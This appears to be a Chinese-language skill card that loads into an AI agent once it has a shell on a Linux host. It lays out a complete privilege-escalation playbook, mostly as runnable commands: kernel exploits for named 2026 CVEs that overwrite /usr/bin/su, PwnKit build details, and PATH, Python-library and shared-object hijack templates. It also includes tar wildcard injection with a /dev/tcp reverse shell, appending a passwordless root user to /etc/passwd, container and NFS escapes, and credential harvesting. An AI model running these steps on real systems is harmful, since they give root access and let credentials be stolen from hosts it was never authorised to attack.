---
name: 'linux-privesc'
description: 'Linux 提权技能：2026 通杀 CVE（Copy Fail/Dirty Frag/GhostLock/内核四件套）+ 容器检测 + 8 阶段检查表。含 **Copy Fail 不需要 userns 的实测纠错**、page-cache 覆写类 exploit 的备份/还原纪律、SUID 不可读时"先找源码"、root 服务跑用户可写二进制时"先确立重启触发"、linpeas 无外网裁段跑法。（检索词：privesc/sudo/SUID/capabilities/linpeas/linpeas -o/Copy Fail/copy-fail/cve-2026-31431/page cache/page-cache/userns/unprivileged_userns_clone/authpam/PAM/源码优先/重启触发/print-deploy/pkexec/PwnKit）'
whenToUse: '拿到 Linux shell 后提权：2026 通杀 CVE + 容器检测 + 8 阶段检查表。'
metadata: { domain: linux, tier: T1 }
---
> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。

# Linux 提权技能

> 🔴 **不自动加载，拿 shell 后按名加载本卡**：有 `skill` 工具 → `skill("linux-privesc")`；有 `skill_search`/`skill_load` → `skill_load("linux-privesc")`；用户手势 → 首行 `/linux-privesc`。加载后先读下面的快速索引匹配场景。

# 触发信号（可观察）: ps 里出现 root 进程，而它的可执行文件/配置在 /home/<user>/ 下
ps -o user,pid,cmd -aux | grep -v '^\[' | awk '$1=="root"'

## 快速索引

| 场景 | 跳转 |
|------|------|
| 刚拿 shell，什么都不知道 | §0 容器检测 (必须先做) → §10 linpeas **裁段**枚举 |
| 内核版本已知 | §1 通杀 CVE: Copy Fail / Dirty Frag / Fragnesia / GhostLock / 内核四件套 / OverlayFS |
| `sudo -l` 有结果 | §3 sudo + 版本 CVE + env_keep → GTFOBins |
| `sudo -l` 里带 `*` 通配符 | 🔴 **参数里的 `*` 可以跨 `/`** ⇒ 可插任意额外参数 → 加载 `argument-injection-option-smuggling`（tcpdump 锚：`-Z`/`-z`/`-V`）|
| 有 capabilities | §3 `getcap -r /` 五件套 |
| 有 SUID 二进制 | §3 `find -perm -4000` 定位 → §9.1–9.6 深挖（**源码优先**） |
| 有 cron/systemd timer | §3 `crontab -l` / `systemctl list-timers` → §9.4 通配符注入 · §9.8 Service/Timer 劫持 |
| 有可写目录/文件 | §5 文件 & 目录 · §9.9 NFS no_root_squash |
| root 服务跑用户可写二进制 | §9.10 **先确立"怎么重启"，再投入** |
| 有 MySQL/PostgreSQL root | → 转 `mysql-udf-privesc` / `postgresql-rce` |
| 是容器环境 | → 加载 `container-escape` |
| 是 snap/flatpak/firejail | → 加载 `noncontainer-sandbox-escape` |
| 内核太新无已知 CVE | §10 linpeas 全量枚举 → §5 文件权限是最稳定的路径 |

> 🔴 2026-09-30 修正：本表原先把 §2/§4/§5/§6/§7/§8 当作 sudo/SUID/cron/文件权限/linpeas/数据库 的目标，
> 而卡内这六个编号实际是 **基础信息 / 进程&服务 / 文件&目录 / 已安装软件 / 已知 CVE 对照 / 密码&凭据**
> —— 路由表把读者指向了**错误的章节**（且 §7 指向的 "linpeas 自动化" 在卡内**根本不存在**）。
> 已按实际编号重写；linpeas 一节本轮补齐为 §10。

## 0. 容器环境检测（拿 shell 第一毫秒！）

```
[ ] cat /proc/1/cgroup 2>/dev/null | grep -E 'docker|lxc|kubepods'
[ ] ls -la /.dockerenv 2>/dev/null
[ ] id | grep -E "docker|lxd|lxc"
[ ] mount | grep overlay
→ 命中 → 🔴 你在容器内！加载 container-escape skill

🆕 非容器沙箱 — 同样第一秒就查！
[ ] snap list 2>/dev/null && echo "⚠️ SNAP → noncontainer-sandbox-escape"
[ ] flatpak list 2>/dev/null && echo "⚠️ FLATPAK → noncontainer-sandbox-escape"
[ ] firejail --list 2>/dev/null && echo "⚠️ FIREJAIL → noncontainer-sandbox-escape"
[ ] find / -perm -4000 -type f 2>/dev/null | grep -q snap-confine && echo "⚠️ snap-confine SUID → noncontainer-sandbox-escape"
→ 命中 → 加载 noncontainer-sandbox-escape 记忆
```

## 1. 2026 通杀内核提权（优先！）

```
[ ] 🔴 前提: cat /proc/sys/kernel/unprivileged_userns_clone  → 多数 2026 LPE 需要为 1
    如果为 0 且有 root 权限可: sysctl kernel.unprivileged_userns_clone=1
    ⚠️ 为 0 且无 root 时【不要整段跳过】—— 但**也不要照"需要 userns"一刀切**：
    🔴 2026-09-30 实测纠错: **Copy Fail 不需要 userns**。Bamboo(HTB Medium) 的
       unprivileged_userns_clone = **0**，linpeas 判 "Dirty Frag 公开 PoC 被挡"，而
       CVE-2026-31431 **一击拿到 root**（AF_ALG 对非特权用户开放，走不到 userns）。
    ┌ 不需要 userns: Copy Fail(CVE-2026-31431) / DiagSpill(CVE-2026-74469) / GhostLock(CVE-2026-43499)
    └ 公开 PoC 需要 userns: DirtyAH6 / TUNderflow / PPPoEject（Dirty Frag 的公开 PoC 同样被挡，
      但内核侧原语可能仍可达 → 结论交给活体探针，不要自己推理）
    🔴 纪律: **先跑 linpeas 的活体探针，再从 userns 开关推理**。linpeas 会真的打一次原语并打印：
       `VULNERABLE: non-destructive AF_ALG/splice page-cache write triggered`（Copy Fail 段），
       或 `... public PoC blocked by disabled user namespaces`（Dirty Frag 段）——**探针说什么就是什么**。

[ ] uname -r → Linux kernel 4.14-7.0? (since 2017, 几乎所有现代发行版)
[ ] CVE-2026-31431 "Copy Fail": AF_ALG algif_aead + splice 覆写 page cache
    └─ 覆写 /usr/bin/su 的 in-memory 副本 → root
    └─ GitHub: 4xura/CVE-2026-31431-Copy-Fail
    └─ Metasploit 已出模块
    └─ 🔴 范围: kernel 4.14 → 7.0-rc (2017年至今的所有主流发行版)
    └─ 🆕 **不需要 userns、不需要任何 CAP**（这是本卡 2026-09-30 纠错的重点）
    └─ 🆕 实测动线（Bamboo，成功）:
       git clone --depth 1 https://github.com/4xura/CVE-2026-31431-Copy-Fail
       cp /usr/bin/su /tmp/su.bak          # 🔴 先备份，见下
       python3 exploit-scripts/exploit.py  # 自包含：内嵌 zlib 压缩的 160B payload
                                           #   = setuid(0)+setgid(0)+execve("/bin/sh")
                                           #   逐 4 字节把 payload 写进 /usr/bin/su 的 page cache
       echo 'id; cat /root/root.txt' | /usr/bin/su    # → uid=0(root)
    └─ 🔴 **收尾纪律（所有 page-cache 覆写类 exploit 通用）**:
       `cp /tmp/su.bak /usr/bin/su && chmod 4755 /usr/bin/su` → 再 `md5sum` 核对回到原值。
       **别拿 `drop_caches` 赌**：被改写的页可能已标脏，刷回磁盘就把 su 永久写坏了；
       重写本体（写路径）才是确定性的还原。

[ ] CVE-2026-43284 "Dirty Frag" (xfrm-ESP): IPsec page-cache write
[ ] CVE-2026-43500 "Dirty Frag" (RxRPC): /etc/passwd 覆写
[ ] CVE-2026-46300 "Fragnesia" (ESP-in-TCP): Dirty Frag 变体，绕过初版补丁
    └─ 检测: ochebotar/copy-fail-CVE-2026-31431-detection-probe

[ ] 🆕 CVE-2026-43499 "GhostLock": rtmutex/futex remove_waiter() 任务处理不当
    └─ 潜伏 15 年；root + 容器逃逸；RHEL 6-10 / SUSE / Oracle UEK 全中
    └─ 🔴 不需要 unprivileged userns

[ ] 🆕 2026-09 内核四件套（Asim Manizada，AI 辅助挖掘；底层 bug 已存在 10-21 年；PoC 全公开）
    └─ DirtyAH6   CVE-2026-80844  IPsec AH6 (IPv6)     需 userns
    └─ TUNderflow CVE-2026-81000  TUN/TAP 虚拟网卡      需 userns
    └─ PPPoEject  CVE-2026-68121  PPPoE                需 userns
    └─ DiagSpill  CVE-2026-74469  SCTP sctp_diag       🔴 不需要 userns、不需要 CAP ← 无 userns 时优先试
        └─ 复制完整 peer transport 列表时越过 Netlink 响应末尾，溢出约 8 MiB
    └─ 🔴 四个的修复版本【各不相同】，别只看一个数:
        DirtyAH6   → 5.10.269 / 5.15.220 / 6.1.187 / 6.6.156 / 6.12.108 / 6.18.49 / 7.1.13 / 7.2.3
        TUNderflow → 5.10.270 / 5.15.221 / 6.1.188 / 6.6.157 / 6.12.109 / 6.18.50 / 7.2.4  ← 最晚落地
        PPPoEject  → 5.10.265 / 5.15.216 / 6.1.183 / 6.6.148 / 6.12.101 / 6.18.42 / 7.1.6 / 7.2
        「四个全修」的最低版本 = 5.10.270 / 5.15.221 / 6.1.188 / 6.6.157 / 6.12.109 / 6.18.50 / 7.2.4
    └─ 映射已核对 oss-sec 原文 + 作者博客（两处一致）；部分聚合站把 TUNderflow/PPPoEject 编号对调，是错的

[ ] 🆕 内核版本在 2015-2021 区间? → 先试 OverlayFS CVE-2021-3493 / CVE-2023-0386
    检测: unshare -rm sh -c "echo ok" 2>&1 | grep -q ok && echo "VULN: user_ns available"
    不熟版本匹配 → 用 linux-exploit-suggester 自动匹配内核 CVE

    🔴🔴 **内核版本 ↔ PoC 必须逐条适配（Dante 实测：选错版本 = 白跑一轮）**
    | 内核 | 该用哪个 | 为什么 |
    |---|---|---|
    | **5.4.x**（Ubuntu 20.04） | ✅ **PwnKit / CVE-2021-4034** | CVE-2023-0386 在 5.4 上**必失败**：`open merge/file: Operation not permitted`，upper dir 空 ⇒ **copy-up 被内核挡住** |
    | **5.15.x**（Ubuntu 22.04） | ✅ CVE-2023-0386 | 该链**只在 5.15+ 有效**，别把"在 22.04 通"当成"在 20.04 也通" |
    ⇒ 纪律：**先 `uname -r` 定版本，再选 PoC**；PoC 报"权限"类错误（EPERM）时，先怀疑**版本不适配**，不要怀疑自己的参数。
```

#### 🔴🆕 PwnKit（CVE-2021-4034）实操四件套 + 两个"必须"（Dante 实测）

```
[ ] 判定是否可打（两条都要看）：
    dpkg -l policykit-1 | tail -1      # 🔴 版本无 `.1/.2` 后缀 = 未打补丁
                                       #    实测可打: 0.105-26ubuntu1
    ls -la /usr/bin/pkexec             # 需要 SUID root
[ ] ① 四件套缺一不可（berdav PoC 布局）：
    gconv-modules（内容 = module UTF-8// PWNKIT// pwnkit 1）
    GCONV_PATH=./pwnkit.so:.        ← 即把 /usr/bin/true 复制成这个名字（PoC 靠它走 gconv 查找）
    恶意 pwnkit.so（导出 gconv_init）+ 启动器（argc=0 + PATH=GCONV_PATH=. + CHARSET=PWNKIT）
[ ] ② 🔴 **PoC 必须在靶机本地编译**：Kali(glibc 2.34) 编的二进制拿到 Ubuntu 20.04(glibc 2.31) 会报
    `version GLIBC_2.34 not found` ⇒ 靶机有 gcc 就【投源码现场编译】；无 gcc 则改用纯脚本型
    polkit CVE-2021-3560（只需 dbus-send + bash，不需要编译器）。
[ ] ③ 🔴 **gconv_init 里不要取交互 shell，改成"跑一个落盘脚本"**（无 PTY、管道不通是常态）：
      gconv_init:   setuid(0); setgid(0);
                    execve("/bin/sh", {"/bin/sh","/tmp/r.sh",NULL}, {只给最小 PATH});
      而 /tmp/r.sh 自己 `exec > /tmp/out 2>&1` 收集结果，结尾 `chmod 666 /tmp/out` ⇒ 低权用户可回读。
      ⇒ 这个形状对**所有"提权后要跑一串枚举"的场景**通用（不依赖任何回显通道）。
[ ] ④ 🔴 **python 启动器：`os.execve(path, [], env)` 在 Ubuntu 20.04 的 Python 3.8 上直接抛
    `ValueError: argv must not be empty`**（新版本 Python 允许空 argv，3.8 不允许）
    ⇒ 正解：**ctypes 直调 libc 并把 argv 传 NULL**：
        libc = ctypes.CDLL("libc.so.6"); libc.execve(b"/usr/bin/pkexec", None, envp)
      （这就是本场真正做成的那一版；写 `os.execve(..., [], ...)` 的那版一次都没成功过。）
[ ] ❌ **已证否 · 别重复**：`policykit-1 0.105-20ubuntu0.18.04.5`（18.04 补丁版）**已修复**，
    且该机**无 gcc** ⇒ PwnKit 与"现场编译"两条腿同时断，别在这台上再试。
```

## 2. 基础信息
```
[ ] id; whoami; uname -a; cat /etc/os-release
[ ] pkexec --version 2>/dev/null                 # PwnKit CVE-2021-4034 (几乎所有旧发行版)
[ ] env; cat /proc/1/environ | tr '\0' '\n'     # 🔴 环境变量第一站！
[ ] sudo -V | head -1
```

## 3. 快速提权
```
[ ] sudo -l                                       # 🔴 最优先！→ 每条 sudo 规则去 GTFOBins 查！
[ ] 🔴 sudo -l 输出含 SETENV: → PYTHONPATH / PERL5LIB 变量注入！
    sudo PYTHONPATH=/tmp/ /allowed/script.py   # 在 /tmp/ 放同名 import 的 .py
[ ] sudo -V | head -1                             # 🔴 版本号！sudo ≤1.9.12p2 → CVE-2023-22809 sudoedit
                                                  # sudo ≤1.8.28 → CVE-2019-14287 uid=-1 绕过
[ ] 🔴 sudo -l 输出含 env_keep+= → LD_PRELOAD / BASH_ENV / PYTHONPATH → 库劫持 (见 §9.6)
[ ] getcap -r / 2>/dev/null → 🔴 优先查: cap_setuid+ep / cap_sys_admin+ep / cap_chown+ep / cap_dac_override+ep / cap_fowner+ep
# cap_setuid+ep → python3/perl → setuid(0); exec("/bin/bash")
# cap_sys_admin+ep → mount 任意操作 / nsenter 容器逃逸
# cap_chown+ep → chown root:root /bin/bash → chmod +s /bin/bash
# cap_dac_override+ep → 直接读写 /etc/shadow
# cap_fowner+ep → chmod 4755 /bin/bash (改 SUID 位!)
[ ] find / -perm -4000 -type f 2>/dev/null        # SUID → 🔴 每个 binary 去 GTFOBins 查！
[ ] find / -perm -2000 -type f 2>/dev/null        # SGID → 检查组权限
[ ] crontab -l; cat /etc/crontab; systemctl list-timers
[ ] 🆕 每个 root timer/cron 脚本 → cat 读源码 → 找 os.path.join / git ls-tree / subprocess
[ ] cat /etc/exports                               # NFS no_root_squash (见 §9.9)
[ ] id | grep -E "docker|lxd|disk|adm"             # 🔴 高危组！(见 §9.7)
```

## 4. 进程 & 服务
```
[ ] ps aux; ss -ntlp                              # 内网服务（尤其 127.0.0.1）
[ ] 🔴 localhost 服务快速检查:
    ss -ltnp | grep 127.0.0.1 → 每个端口都是独立攻击面
    25151 → Cobbler XMLRPC (CVE-2024-47533)
    54321 → Python eval 注入
    2375 → Docker API
    9092 → Kafka broker
    3000 → 🆕 Gitea 本地实例 → 检查 template-sync / cron 脚本
[ ] 🔴 ipa 二进制存在 → freeipa-pentesting — 这是 FreeIPA 环境
[ ] strings /dev/mem -n10 2>/dev/null | grep -i pass
[ ] 🔴 pspy — 无 root 权限监控进程: ./pspy64 -pf -i 1000  # 观察 cron/timer 实际执行了什么命令
[ ] 🆕 systemctl list-timers → 每个 root timer → cat 对应脚本 → 找: os.path.join, git ls-tree, subprocess, shutil.copy
```

## 5. 文件 & 目录
```
[ ] find / -writable -type f 2>/dev/null | grep -v proc
[ ] find / -name "*.env" -o -name "*.conf" -o -name "*.bak" -o -name "*.old" 2>/dev/null | grep -v proc
[ ] grep -r "password\|secret\|key" /etc/ /opt/ /var/ 2>/dev/null | head -20
[ ] find / -name ".git" -type d 2>/dev/null                   # 🔴 Git 仓库 → git log / git diff 找凭据
[ ] cat ~/.docker/config.json 2>/dev/null                     # 🔴 Docker registry 凭据 (base64)
[ ] cat ~/.git-credentials 2>/dev/null                        # 🔴 Git 凭据存储
[ ] find / -type f -name "id_rsa" -o -name "*.pem" 2>/dev/null # SSH 私钥
[ ] cat /etc/passwd /etc/shadow 2>/dev/null                   # 🔴 检查是否可写！
    → passwd 可写 → echo "root2::0:0:root:/root:/bin/bash" >> /etc/passwd → su root2
    → shadow 可写 → openssl passwd -1 newpass → 替换 root 的 hash
```

## 6. 已安装软件
```
[ ] dpkg -l; rpm -qa
[ ] 每个版本号 → searchsploit
[ ] 🔴 优先级: sudo > polkit > snapd > Docker
```

## 7. 已知 CVE 对照
```
🔴 2026 page-cache/COW 覆写家族（确定性缺陷，可靠性极高，优先）:
   Copy Fail  CVE-2026-31431  (AF_ALG algif_aead + splice → 覆写 /usr/bin/su 内存副本; kernel 4.14→7.0-rc)
   Dirty Frag CVE-2026-43284 + CVE-2026-43500  (xfrm-ESP 4字节写 + RxRPC 原地解密; CVSS 7.8; PoC=Kukurigu/EDB-52585)
   Fragnesia  CVE-2026-46300  (ESP-in-TCP，绕过初版补丁)
   DirtyDecrypt CVE-2026-31635 / PinTheft CVE-2026-43494 / pedit-COW CVE-2026-46331
🔴 2026 网络子系统四件套（bug 潜伏 10-21 年）:
   DirtyAH6 CVE-2026-80844 / TUNderflow CVE-2026-81000 / PPPoEject CVE-2026-68121 / DiagSpill CVE-2026-74469
   └─ 前三个需 userns；DiagSpill 不需要。修复版本 5.10.270/5.15.221/6.1.188/6.6.157/6.12.109/6.18.50/7.2.4
🔴 2026 GhostLock CVE-2026-43499 (rtmutex/futex; 15年; root + 容器逃逸; 不需 userns)
🔴 Dirty Frag 检测特征: 60s 内 ≥50 次 splice() 来自用户可写路径 + 5min 内同 session 执行 setuid 二进制
🔴 OverlayFS: CVE-2021-3493 (Ubuntu 20.04/21.04), CVE-2023-0386 (Ubuntu 22.04/22.10)
经典: PwnKit (CVE-2021-4034), Baron Samedit (CVE-2021-3156), DirtyPipe (CVE-2022-0847), DirtyCow (CVE-2016-5195)
🆕 Cobbler: CVE-2024-47533 (localhost:25151 XMLRPC unauth → root)
🆕 Xvfb: 检测 display :99 → xwd -root -out screen.xwd → 屏幕截图提权
🆕 udisks2: CVE-2025-6019 (XFS resize race → SUID shell)
🆕 PAM: CVE-2025-6018 (.pam_environment → allow_active bypass)
🆕 Sudo: CVE-2025-32463 (<1.9.16), CVE-2023-22809 (sudoedit ≤1.9.12p2)
```

## 8. 密码 & 凭据
```
[ ] env; cat /proc/1/environ | tr '\0' '\n'
[ ] ~/.bash_history; /root/.bash_history
[ ] ~/.ssh/id_rsa; /root/.ssh/id_rsa
[ ] 🔴 每个密码 → 试 SSH / sudo / su
```

## 9. 🆕 SUID / Cron 利用链（HTB 经典提权）

### 9.1 SUID Binary 分析
```
# 找到 SUID binary 后，不是直接放弃 — 分析它做了什么
strings /path/to/suid_binary                          # 看它调了哪些命令
strace /path/to/suid_binary 2>&1 | grep execve        # 看实际 exec 调用
ltrace /path/to/suid_binary 2>&1 | grep -E "system|exec|popen"

🔴 关键模式: binary 调了不带绝对路径的命令 → PATH 劫持
🔴 关键模式: binary 是 Python 脚本 → 库劫持
🔴 关键模式: binary 在可写目录执行 tar/tar.gz 操作 → wildcard 注入

🆕 🔴 **二进制不可读（`-r-s--x--x` 这类 4111/4511）时，别盲测行为** ——
   `strings`/`ldd`/`strace` 全部失效（非 root 读不了、也 trace 不了 setuid 进程）。
   先花 1 分钟在盒内找**源码/示例/文档**，它们常常就躺在同一棵树里：
     find / -name '<binary>*.c' -o -name '<binary>*.py' 2>/dev/null
     ls -la <app>/examples/ <app>/examples/providers/     # 厂商自带的 provider 样例
   🔴 2026-09-30 实测（Bamboo）: PaperCut 的 SUID `authpam` 不可读，但
     `/home/papercut/server/examples/providers/authpam.c` **就是它的源码**，一分钟读完即可判死 ——
     它只做 `pam_start("<服务名>", username, &conv)`，而 `/etc/pam.d/<服务名>` 若只 include
     `@include common-password`（**只有 password 栈**），`pam_authenticate` 恒返回失败 ⇒ 无认证绕过可言。
   **纪律：SUID 不可读 → 先找源码再决定是否投入；先读源码再盲测行为。**
```

### 9.2 PATH 劫持
```
# 条件: SUID binary 调了不带绝对路径的命令 (如 cat / id / backup)
# 利用: 在 PATH 前面放恶意同名文件

echo '#!/bin/bash' > /tmp/cat
echo '/bin/bash -p' >> /tmp/cat                    # -p 保留 SUID 权限
chmod +x /tmp/cat
export PATH=/tmp:$PATH
/path/to/suid_binary                                # 以 root 执行 → spawn root shell

# 常见目标命令: cat, id, ls, cp, mv, tar, gzip, systemctl, service, backup, cleanup
```

### 9.3 Python 库劫持
```
# 条件: root cron 或 SUID binary 执行 python3 /path/to/script.py
# 且你对 script 所在目录有写权限

# 在 script 目录放同名 .py 劫持 import
# 目标 import os / import random / import subprocess → 放 os.py / random.py

echo 'import os; os.system("cp /bin/bash /tmp/bash && chmod 4755 /tmp/bash")' \
  > /path/to/script_dir/os.py

# Python 优先搜索当前脚本目录 → 先于系统库加载
# 🔴 验证: python3 -c "import sys; print(sys.path)" → 看搜索顺序
```

### 9.4 Wildcard 注入（cron 用 tar 备份）
```
# 条件: cron 在可写目录执行 tar cf /backup/xxx.tar * (不带 --)
# 利用: 创建文件名为 tar 选项的文件

touch -- --checkpoint=1
touch -- --checkpoint-action=exec=/bin/bash

# 或更隐蔽:
echo 'bash -i >& /dev/tcp/IP/PORT 0>&1' > /tmp/rev.sh
chmod +x /tmp/rev.sh
touch -- --checkpoint=1
touch -- "--checkpoint-action=exec=sh /tmp/rev.sh"

# 🔴 检测: ls -la | grep '^-'  → 文件名以 - 开头说明已有注入痕迹
# 🔴 防御侧: tar cf backup.tar ./* (用 ./* 而非 * 避免 -- 文件)
```

### 9.5 常见 SUID 利用速查
```
# SUID find    → find . -exec /bin/bash -p \; -quit
# SUID python  → python -c 'import os; os.execl("/bin/bash","bash","-p")'
# SUID bash    → /bin/bash -p
# SUID less    → less /etc/passwd → 按 ! → /bin/bash
# SUID vim     → vim → :!bash
# SUID systemctl → 创建恶意 service → systemctl start
# SUID cp/mv   → 覆盖 /etc/passwd /etc/sudoers
# SUID tar     → tar cf - /etc/shadow 2>/dev/null | tar xf - -O
```
⚠️ **`SUID find` 提权必须「内联在 `sh -p` 里」，不要套 bash** ——
`find . -exec sh -p -c 'id' \;` ✅ ；`find . -exec /bin/bash -c '…' \;` ❌（**套 bash 会丢掉 euid**，
于是你以为"这条路不通"，其实只是形态写错了）。

### 9.6 Shared Object / Library 劫持
```
# 条件: SUID binary → ldd 确认 + 依赖路径可写 或 LD_PRELOAD env_keep

# ① 找缺失的 .so (最理想)
ldd /path/to/suid_binary | grep "not found"
# → 在 PATH 中任意可写目录放恶意 .so → binary 自动加载

# ② 找依赖的 .so，检查其目录是否可写
ldd /path/to/suid_binary
# → 任意 .so 所在目录可写 → 替换为恶意 .so

# 恶意 .so 模板 (libhijack.c):
#   #include <stdlib.h>
#   void __attribute__((constructor)) hijack() {
#     setuid(0); setgid(0);
#     system("cp /bin/bash /tmp/bash && chmod 4755 /tmp/bash");
#   }
# 编译: gcc -shared -fPIC -o libhijack.so libhijack.c

# ③ LD_PRELOAD (sudo -l 含 env_keep+=LD_PRELOAD)
# 同上恶意 .so → sudo LD_PRELOAD=/tmp/libhijack.so /allowed/command
```

### 9.7 Groups Abuse（高危组成员利用）
```
# 🔴 Writable Docker socket (不需要 docker 组!)
[ ] ls -la /var/run/docker.sock 2>/dev/null
    → 可写 → docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host bash
    → 🔴 等价于 root！不依赖 docker 组，只要 socket 本身可写

# docker 组 → 容器逃逸 → 宿主机 root
docker run -v /:/mnt --rm -it alpine chroot /mnt bash

# lxd 组 → 创建特权容器 → mount 宿主机 FS
# 攻击机: git clone https://github.com/saghul/lxd-alpine-builder && cd lxd-alpine-builder && ./build-alpine
# 传到目标: lxc image import alpine.tar.gz --alias alpine
#   lxc init alpine privesc -c security.privileged=true
#   lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
#   lxc start privesc && lxc exec privesc /bin/sh
#   → /mnt/root 就是宿主机根目录！

# disk 组 → 直接读磁盘 → debugfs /dev/sda1 (仅 ext*, XFS 用 xfs_db)
#   → 绕过文件权限读任意文件

# adm 组 → 读 /var/log 所有日志 → /var/log/auth.log 可能有 ssh 密码
#   用户输密码时误敲在用户名框 → 明文密码留在 auth.log

# 🆕 screen/tmux 残留 session (attached 即 root)
screen -ls 2>/dev/null; tmux ls 2>/dev/null
# → screen -x root/ 或 tmux attach → 直接拿到 root shell
```

### 9.8 systemd Service / Timer 劫持
```
# 条件: 可写 root systemd service 或 timer 文件 (/etc/systemd/system/ 或 /usr/lib/systemd/system/)

# ① 列出 timer → 找到 timer 对应的 service
systemctl list-timers --all
#   → 目标: /usr/lib/systemd/system/some-backup.timer
#   → 查 .timer 内容: cat /usr/lib/systemd/system/some-backup.timer → OnCalendar / Unit

# ② 如果可写 .service 或 .timer 中的 Unit:
#   echo '#!/bin/bash' > /tmp/pwn.sh
#   echo '/bin/bash -c "cp /bin/bash /tmp/bash && chmod 4755 /tmp/bash"' >> /tmp/pwn.sh
#   chmod +x /tmp/pwn.sh

#   修改 .service 中的 ExecStart= 指向 /tmp/pwn.sh
#   → timer 触发 → 以 root 执行 → /tmp/bash -p

# ③ 如果自己的 service 目录可写 (~/.config/systemd/user/)
#   → 创建 user service 然后在权限允许的 range 内执行
#   但普通 user service 不能提权 (以自身用户运行)

# 🔴 优先检查: /etc/systemd/system/*.service → 是否 www-data/普通用户可写
# 🔴 HTB 经典: cron 间接调 systemctl start → service 文件中 ExecStart 可写
```

### 9.9 NFS no_root_squash
```
# 条件: cat /etc/exports 有 no_root_squash + 攻击机可达 NFS

# 攻击机以 root 挂载
mount -t nfs -o rw,vers=3 <NFS_SERVER>:/export /mnt/nfs

# 投放 SUID bash → 目标机执行 /mnt/nfs/bash -p 即得 root
cp /bin/bash /mnt/nfs/bash && chmod 4755 /mnt/nfs/bash

# 🔴 如果 exports 限制 IP 段 → 检查跳板机/VPN 是否在允许段内
```

### 9.10 root 服务跑「用户可写」的二进制 —— 🔴 先确立重启触发，再投入

```
# 然后用 find 核对权限位：文件 owner 是当前用户 ⇒ 可写
ls -la <path/to/root-executed-binary> <dir>/*.conf
systemctl show <unit> -p Restart -p RestartUSec -p User -p ExecStart   # User= 空 = root

🔴 必要条件（**先问，别先试**）: 这个 root 进程**怎么才会重启**？
   ① 我能杀掉它吗？  ← 不能（无信号权限）
   ② 它会自己重读配置吗？ ← 用一个无害改动验：改 conf 前后比 `ps -o pid,lstart` 的启动时间
   ③ 有 root cron/timer 拉起它吗？ ← crontab -l / /etc/cron* / systemctl list-timers --all
   ④ 上层应用有"重启/更新 provider"的接口吗？（PaperCut 这类应用常把 provider 当插件管）
   三个都"否" ⇒ **当场判死，不试变体**（改路径/改 include/造 glob 目录都是徒劳）

🔴 HTB 案例（Bamboo，本卡 2026-09-30 回灌）: systemd `pc-print-deploy.service` 以 root 跑
   `/home/papercut/providers/print-deploy/linux-x64/pc-print-deploy`，整目录 + `pc-print-deploy.conf`
   + `v*/include.conf` 全对 papercut 可写，`Restart=always RestartUSec=2min` —— 看着像白送的 root。
   实测：改 `include.conf` 后 launcher(514) 与 child(640) 的 **PID/启动时间完全不变**（不重载），
   且无法向 root 进程发信号 ⇒ **没有触发 = 没有这条路**。当时在此耗尽 ~10 min 后转向内核 CVE。
   ⚠️ 诚实标注：该分支只被判"缺触发"，**未穷尽**（PaperCut 应用侧的 provider 管理接口没查）——
   若日后发现触发点，这里应补一条正例。
```

## 快速优先级
| 优先级 | 项 | 命令 |
|--------|----|------|
| 🔴 0 | 容器检测 | `cat /proc/1/cgroup` → container-escape |
| 🔴 1 | 2026 通杀 | `unshare` 先决 + `uname -r` → Copy Fail / Dirty Frag / OverlayFS |
| 🔴 2 | sudo | `sudo -l` → GTFOBins + `sudo -V` 版本 CVE + env_keep |
| 🔴 3 | env | `env; cat /proc/1/environ` |
| 🔴 4 | capabilities | `getcap -r /` → GTFOBins |
| 🔴 5 | SUID/SGID | `find / -perm -4000` → GTFOBins + `ldd` 库劫持 |
| 🔴 6 | 高危组 | `id` → docker/lxd/disk/adm |
| 🔴 7 | cron/systemd | `crontab -l; systemctl list-timers` + pspy + 查可写 service 文件 |
| 🔴 8 | NFS | `cat /etc/exports` → no_root_squash |
| 🟠 9 | 进程 | `ps aux; ss -ntlp` |
| 🔵 10 | 软件 | `dpkg -l` → searchsploit |

---

## 10. 自动化枚举（linpeas）—— 🔴 无外网时**必须**裁段，否则挂死

```bash
# 上传（目标能回连攻击机时最省事；Kali 上把脚本放进 www 目录）
python3 -m http.server 8000            # 攻击机
curl -s -o /tmp/lp.sh http://<LHOST>:8000/linpeas.sh && chmod +x /tmp/lp.sh

# 🔴 别直接 -a 就跑：盒内没有元数据路由时，它会在 **Cloud/AWS EC2** 段长时间挂住
#    （2026-09-30 实测：-a 跑到 393 行卡死在 "AWS EC2 Enumeration"，白等 ~10 min）
nohup /tmp/lp.sh -q -N -o system_information,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_perms_files,interesting_files,api_keys_regex > /tmp/lp.out 2>&1 &
wc -l /tmp/lp.out && tail -3 /tmp/lp.out      # 轮询进度

# 可选段名（-o 逗号分隔）: system_information / container / cloud / procs_crons_timers_srvcs_sockets /
#   network_information / users_information / software_information / interesting_perms_files /
#   interesting_files / api_keys_regex     （-a = 全跑 + 1min 进程采样 + su 爆破）
```

🔴 **读回结果的两条纪律**：
1. linpeas 里 **"Checking for Copy Fail / Dirty Frag / Kernel Exploit Registry" 三段是活体结论**，
   优先级高于任何"某 CVE 需要什么前提"的先验 —— 见 §1 的纠错。
2. 输出含大量 Unicode 制表符，回传到 Windows 后 `read` 会报 **invalid UTF-8**；
   先在目标侧或本地把非 ASCII 字节映射成 `.` 再读（PowerShell：按字节过滤 32–126）。

